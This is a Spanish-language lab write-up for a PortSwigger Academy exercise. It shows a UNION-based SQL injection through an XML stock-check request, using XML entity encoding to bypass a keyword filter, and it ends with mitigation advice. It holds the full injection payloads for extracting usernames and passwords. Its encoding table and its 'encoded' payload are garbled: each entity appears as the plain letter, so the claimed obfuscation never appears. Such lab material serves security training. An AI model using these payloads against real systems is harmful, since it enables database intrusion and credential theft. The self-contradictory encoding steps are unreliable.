Lab18: SQL injection with filter bypass via XML encoding

Nivel Practitioner
Tipo de SQLi In-band SQLi (Bypass via XML Encoding)

Objetivo

Obtener las credenciales de la tabla users (usuario y contraseña del administrador) evadiendo un filtro de seguridad que bloquea palabras clave SQL mediante el uso de codificación XML.

Vulnerabilidad

La aplicación recibe datos en formato XML a través de una petición POST. El filtro de seguridad (WAF/IPS) busca palabras como UNION o SELECT en texto plano, pero no inspecciona entidades codificadas dentro del XML.

Esto permite al atacante ofuscar el payload mediante entidades XML (decimales o hexadecimales) para evadir el filtro. La base de datos decodifica automáticamente las entidades antes de ejecutar la consulta, por lo que el ataque tiene éxito a pesar del filtro.

Nota importante: Este laboratorio requiere la versión Professional de Burp Suite o el uso de extensiones como "Hackvertor" para codificar automáticamente los payloads. Con la versión Community se puede realizar manualmente, pero el proceso es más tedioso.

Procedimiento

Nota: En el documento original se menciona que este laboratorio requiere la versión Professional de Burp Suite o extensiones como Hackvertor. A continuación se explica el procedimiento teórico y manual para evadir el filtro mediante codificación XML.

  1. Localizar la funcionalidad vulnerable. En este laboratorio, la aplicación tiene una función de verificación de stock que envía datos en XML. Por ejemplo, al hacer clic en "Check stock" para un producto, se envía una petición POST con contenido XML. 
    POST /product/stock HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
  2. Probar una inyección simple en el tag <storeId> para confirmar la vulnerabilidad: 
    <storeId>1 UNION SELECT NULL</storeId>

    Es probable que el filtro bloquee esta petición debido a la palabra "UNION".

  3. Ofuscar el payload mediante entidades XML. Codificar las palabras reservadas en entidades decimales o hexadecimales:

    Ejemplo de codificación hexadecimal:

    U -> U
N -> N
I -> I
O -> O
N -> N
S -> S
E -> E
L -> L
C -> C
T -> T

    La palabra UNION codificada en hexadecimal sería: UNION

    La palabra SELECT codificada sería: SELECT

  4. Construir el payload ofuscado para extraer las credenciales: 
    <storeId>1 UNION SELECT username, password FROM users</storeId>
  5. Enviar la petición con el payload codificado. El filtro no detecta las palabras clave porque están representadas como entidades XML, pero la base de datos las decodifica antes de ejecutar la consulta.
  6. Observar la respuesta. Si la inyección es exitosa, la respuesta contendrá los nombres de usuario y contraseñas de la tabla users.
  7. Identificar las credenciales del administrador en la respuesta.
  8. Iniciar sesión con las credenciales obtenidas para resolver el laboratorio.

Payload ofuscado completo

<storeId>1 UNION SELECT username, password FROM users</storeId>

Explicación del payload

  • <storeId>1: Valor original del ID de tienda, seguido de un espacio.
  • UNION: Representación hexadecimal de la palabra "UNION". El filtro no la detecta porque no es texto plano.
  • SELECT: Representación hexadecimal de la palabra "SELECT".
  • username, password FROM users: Parte del payload que no necesita codificación porque no contiene palabras clave bloqueadas (aunque "FROM" y "users" podrían codificarse también si fuera necesario).
  • </storeId>: Cierre de la etiqueta XML.

Funcionamiento del bypass

El filtro de seguridad (WAF/IPS) analiza el tráfico HTTP en busca de patrones de ataque conocidos. Al ver el payload:

1 UNION SELECT username, password FROM users

el filtro detecta las palabras "UNION" y "SELECT" y bloquea la petición.

Sin embargo, al enviar el payload codificado:

1 UNION SELECT username, password FROM users

el filtro no reconoce las entidades XML como palabras clave. Cuando el servidor procesa el XML, las entidades se decodifican automáticamente antes de que la consulta llegue a la base de datos, por lo que la base de datos recibe el payload original sin codificar y lo ejecuta.

Verificación del ataque

La vulnerabilidad se confirmaría al observar que:

  • La petición con el payload codificado no es bloqueada por el filtro.
  • La respuesta HTTP contiene los nombres de usuario y contraseñas de la tabla users.
  • Las credenciales del administrador aparecen en la respuesta.

Ejemplo de respuesta esperada:

administrator: 8fg5h2j1k4m9p3q7r2s5
carlos: password123
wiener: passw0rd

Esto demostraría que:

  • Los filtros basados únicamente en detección de palabras clave son insuficientes.
  • La codificación de payloads puede evadir WAFs y sistemas de prevención.
  • Es posible ejecutar ataques SQLi incluso en presencia de filtros superficiales.

Una vez obtenidas las credenciales, se inicia sesión como administrator, resolviendo el laboratorio.

Resultado esperado: El laboratorio se resuelve correctamente al evadir el filtro mediante codificación XML e iniciar sesión como administrator, apareciendo el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.

Mitigación recomendada

Validar y Desinfectar después de la Decodificación

Los filtros de seguridad deben aplicarse después de decodificar los datos, no antes. Cualquier validación de entrada debe realizarse sobre los datos ya procesados y decodificados, no sobre el XML crudo.

Consultas Preparadas (Parameterized Queries)

Implementar consultas parametrizadas es la defensa principal, independientemente de cómo se codifiquen los datos. Al usar parámetros, incluso si el atacante logra evadir el filtro, los datos no se interpretarán como código SQL.

SELECT * FROM products WHERE store_id = ?

Lista Blanca de Caracteres Permitidos

Para campos numéricos como storeId, validar estrictamente que el contenido sea solo dígitos después de la decodificación XML. Rechazar cualquier valor que contenga letras o caracteres especiales.

Deshabilitar Entidades Externas XML

Configurar el procesador XML para deshabilitar la resolución de entidades externas y la expansión de entidades generales. Esto también ayuda a prevenir ataques XXE (XML External Entity).

Validación de Esquema XML

Implementar validación contra un esquema XML (XSD) que defina estrictamente la estructura y tipos de datos esperados. Rechazar cualquier XML que no cumpla con el esquema.

Principio de Menor Privilegio

La cuenta de base de datos debe tener permisos mínimos, limitando el acceso a tablas sensibles como users.

WAF con Decodificación Profunda

Utilizar WAFs que realicen decodificación profunda (deep decoding) de protocolos como XML antes de aplicar las reglas de detección.

Escapado de Caracteres Especiales

Como defensa adicional en profundidad, escapar correctamente los caracteres especiales SQL, aunque esto no sea suficiente si no se usan consultas preparadas.
